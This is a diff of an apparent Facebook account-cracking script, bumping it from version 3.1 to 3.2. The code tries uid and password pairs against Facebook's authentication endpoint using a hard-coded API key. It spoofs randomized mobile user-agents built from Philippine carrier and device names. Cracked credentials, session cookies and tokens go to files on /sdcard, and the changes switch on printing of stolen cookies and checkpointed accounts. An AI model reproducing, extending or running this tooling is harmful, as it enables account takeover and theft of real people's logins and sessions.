@@ -73,7 +73,7 @@ def logo():
  \033[1;36m[•] Status    :   Free
  \033[1;36m[•] Tool      :   Free 
  \033[1;36m[•] Facebook  :   RIZEL GALLARDO
- \033[1;36m[•] Version   :   3.1
+ \033[1;36m[•] Version   :   3.2
 
 ╰────────────────────────────────────────────────────╯''')
 
@@ -412,7 +412,7 @@ class Ishmum:
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-				headers = {'User-Agent':iAmMethod1Ua(),
+				headers = {'User-Agent':ishmum_ua,
 'Content-Type': 'application/x-www-form-urlencoded',
 'Host': 'graph.facebook.com',
 'X-FB-Net-HNI': '45201',
@@ -436,12 +436,12 @@ class Ishmum:
 					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
 				    #(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
 					ok.append(uid)
-					#p("\033[1;33m[COOOKII-🥵] :\033[1;33m "+cok)
+					p("\033[1;33m[🍪] :\033[1;33m "+cok)
 					open('/sdcard/ISHMUM_OK.txt','a').write(uid+'|'+pw+'\n')					
 					open('/sdcard/ISHMUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
 					break
 				elif 'www.facebook.com' in q['error']['message']:
-					#p('\r\033[1;35m[ISHMUM-CP] %s | %s \033[1;97m '%(uid,pw))
+					p('\r\033[1;35m[ISHMUM-CP] %s | %s \033[1;97m '%(uid,pw))
 					cp.append(uid)
 					open('/sdcard/ISHMUM_M1_CP.txt','a').write(uid+'|'+pw+'\n')
 					break
@@ -570,7 +570,7 @@ class Ishmum:
 			fbcr = random.choice(["PLDT","Smart Communications","Globe Telecom","SMART","Globe","Smart-PH","Globe-PH","DITO Telecommunity","PLDT-PH","Sky","ABS-CBN"])
 			fban = random.choice(["FB4A", "FB5A", "FB6A"])
 			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
-			ishmum_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
+			ishmum_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBBV/{fbbv};FBLC/en_US;FBCR/{fbcr};FBMF/TECNO;FBBD/TECNO;FBPN/{fbpn};FBDV/TECNO-W3;FBSV/{fbsv};FBOP/1;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
 			fn = nm.split(' ')[0]
 			try:
 				ln = nm.split(' ')[1]
